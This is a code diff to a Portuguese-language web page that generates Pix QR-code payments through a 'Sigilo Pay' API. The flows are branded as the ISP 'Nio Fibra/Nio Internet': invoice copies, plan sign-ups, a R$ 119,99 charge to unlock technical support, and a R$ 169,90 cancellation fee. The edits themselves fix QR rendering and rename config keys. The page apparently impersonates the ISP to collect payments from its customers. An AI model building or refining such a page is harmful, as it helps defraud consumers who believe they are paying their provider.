@@ -1641,13 +1641,20 @@ if (nioEmpresas) empresasObs.observe(nioEmpresas);
 /* PIX display */
 .sp-pix-box { text-align: center; padding: 8px 0; }
 .sp-qr-placeholder {
-  width: 180px; height: 180px; margin: 0 auto 16px;
+  width: 200px; height: 200px; margin: 0 auto 16px;
   border: 2px solid #e0e0e0; border-radius: 12px;
   display: flex; align-items: center; justify-content: center;
-  background: #fafafa; overflow: hidden;
+  background: #fff; overflow: hidden; padding: 8px;
+  box-sizing: border-box;
 }
 .sp-qr-placeholder img { width: 100%; height: 100%; object-fit: contain; }
-.sp-qr-placeholder canvas { width: 100% !important; height: 100% !important; }
+.sp-qr-placeholder canvas { 
+  width: 184px !important; height: 184px !important;
+  display: block !important;
+}
+.sp-qr-placeholder table {
+  margin: 0 !important;
+}
 .sp-pix-amount { font-size: 1.8rem; font-weight: 900; color: #1a7200; margin-bottom: 6px; }
 .sp-pix-label { font-size: .85rem; color: #666; margin-bottom: 16px; }
 .sp-pix-code-box {
@@ -1769,7 +1776,7 @@ if (nioEmpresas) empresasObs.observe(nioEmpresas);
       <!-- Step 4: Pix -->
       <div class="sp-panel" id="p2via-4">
         <div class="sp-pix-box">
-          <div class="sp-qr-placeholder" id="2via-qr"><canvas id="2via-qr-canvas"></canvas></div>
+          <div class="sp-qr-placeholder" id="2via-qr"></div>
           <div class="sp-pix-amount" id="2via-pix-amount"></div>
           <div class="sp-pix-label">Escaneie o QR Code ou copie o código abaixo</div>
           <div class="sp-pix-code-box" id="2via-pix-code"></div>
@@ -1816,7 +1823,7 @@ if (nioEmpresas) empresasObs.observe(nioEmpresas);
       <!-- Step 2: Pix -->
       <div class="sp-panel" id="pcon-2">
         <div class="sp-pix-box">
-          <div class="sp-qr-placeholder" id="con-qr"><canvas id="con-qr-canvas"></canvas></div>
+          <div class="sp-qr-placeholder" id="con-qr"></div>
           <p style="font-size:.85rem;color:#666;margin-bottom:8px;">Escaneie o QR Code ou copie o código para pagar a <strong>primeira mensalidade</strong> e ativar seu plano:</p>
           <div class="sp-pix-amount" id="con-pix-amount"></div>
           <div class="sp-pix-code-box" id="con-pix-code"></div>
@@ -1889,7 +1896,7 @@ if (nioEmpresas) empresasObs.observe(nioEmpresas);
       <div class="sp-panel" id="psup-4">
         <div class="sp-pix-box">
           <p style="font-size:.88rem;color:#666;margin-bottom:12px;">Pague o Pix abaixo para liberar seu suporte técnico:</p>
-          <div class="sp-qr-placeholder"><canvas id="sup-qr-canvas"></canvas></div>
+          <div class="sp-qr-placeholder" id="sup-qr"></div>
           <div class="sp-pix-amount" id="sup-pix-amount">R$ 119,99</div>
           <div class="sp-pix-label">Escaneie o QR Code ou copie o código abaixo</div>
           <div class="sp-pix-code-box" id="sup-pix-code"></div>
@@ -1953,7 +1960,7 @@ if (nioEmpresas) empresasObs.observe(nioEmpresas);
       <div class="sp-panel" id="pcan-4">
         <div class="sp-pix-box">
           <p style="font-size:.88rem;color:#666;margin-bottom:12px;">Pague para concluir a solicitação de cancelamento:</p>
-          <div class="sp-qr-placeholder"><canvas id="can-qr-canvas"></canvas></div>
+          <div class="sp-qr-placeholder" id="can-qr"></div>
           <div class="sp-pix-amount">R$ 169,90</div>
           <div class="sp-pix-label">Escaneie o QR Code ou copie o código abaixo</div>
           <div class="sp-pix-code-box" id="can-pix-code"></div>
@@ -2084,22 +2091,29 @@ function spMaskPhone(el) {
 // ─── SIGILO PAY API ──────────────────────────────────────────────────────────
 async function spGerarPix({ amount, name, email, description, canvas_id, code_id, amount_id, timer_id, copy_id }) {
   try {
-    const resp = await fetch(`${SP_CONFIG.apiUrl}/v1/transactions`, {
+    const resp = await fetch(`${SP_CONFIG.sigiloApi}/v1/transactions`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${SP_CONFIG.token}`
+        'Authorization': `Bearer ${SP_CONFIG.sigiloToken}`
       },
       body: JSON.stringify({
-        amount: Math.round(amount * 100), // centavos
+        amount: Math.round(amount * 100),
         paymentMethod: 'pix',
         customer: { name, email },
-        description,
-        webhook: SP_CONFIG.webhook
+        description
       })
     });
     const data = await resp.json();
-    const pixCode = data?.pix?.qrCode || data?.qrCode || data?.pixCode || '';
+    // Sigilo Pay retorna o QR em diferentes campos dependendo da versão
+    const pixCode = data?.pix?.qrCode
+      || data?.pix?.emv
+      || data?.qrCode
+      || data?.emv
+      || data?.pixCode
+      || data?.data?.pix?.qrCode
+      || data?.data?.qrCode
+      || '';
     const pixVal = (amount).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 
     if (amount_id) document.getElementById(amount_id).textContent = pixVal;
@@ -2108,12 +2122,19 @@ async function spGerarPix({ amount, name, email, description, canvas_id, code_id
 
     // Gerar QR Code
     if (canvas_id && pixCode) {
-      const canvas = document.getElementById(canvas_id);
-      new QRCode(canvas.parentElement, {
-        text: pixCode, width: 176, height: 176,
-        colorDark: '#192b1c', colorLight: '#ffffff',
-        correctLevel: QRCode.CorrectLevel.M
-      });
+      const container = document.getElementById(canvas_id);
+      if (container) {
+        // Limpa container antes de gerar novo QR
+        container.innerHTML = '';
+        new QRCode(container, {
+          text: pixCode,
+          width: 184,
+          height: 184,
+          colorDark: '#192b1c',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.H
+        });
+      }
     }
     // Timer
     if (timer_id) spStartTimer(timer_id, 30 * 60);
@@ -2268,7 +2289,7 @@ async function sp2viaStep3() {
     name:        nome,
     email:       email,
     description: 'Mensalidade Nio Fibra - CPF ' + sp2viaSelectedInvoice.cpf,
-    canvas_id:   '2via-qr-canvas',
+    canvas_id:   '2via-qr',
     code_id:     '2via-pix-code',
     amount_id:   '2via-pix-amount',
     timer_id:    '2via-timer',
@@ -2301,7 +2322,7 @@ async function spContratarStep1() {
     amount: plano.valor,
     name: nome, email,
     description: `Contratação ${plano.nome}`,
-    canvas_id: 'con-qr-canvas',
+    canvas_id: 'con-qr',
     code_id: 'con-pix-code',
     amount_id: 'con-pix-amount',
     timer_id: 'con-timer',
@@ -2339,7 +2360,7 @@ async function spSuporteStep3() {
     amount: SP_CONFIG.suporteValor,
     name: nome, email,
     description: 'Regularização débito - Nio Internet',
-    canvas_id: 'sup-qr-canvas',
+    canvas_id:   'sup-qr',
     code_id: 'sup-pix-code',
     amount_id: 'sup-pix-amount',
     timer_id: 'sup-timer',
@@ -2374,7 +2395,7 @@ async function spCancelarStep3() {
     amount: SP_CONFIG.cancelarValor,
     name: nome, email,
     description: 'Taxa cancelamento contrato - Nio Internet',
-    canvas_id: 'can-qr-canvas',
+    canvas_id:   'can-qr',
     code_id: 'can-pix-code',
     timer_id: 'can-timer',
     copy_id: 'can-copy-btn'
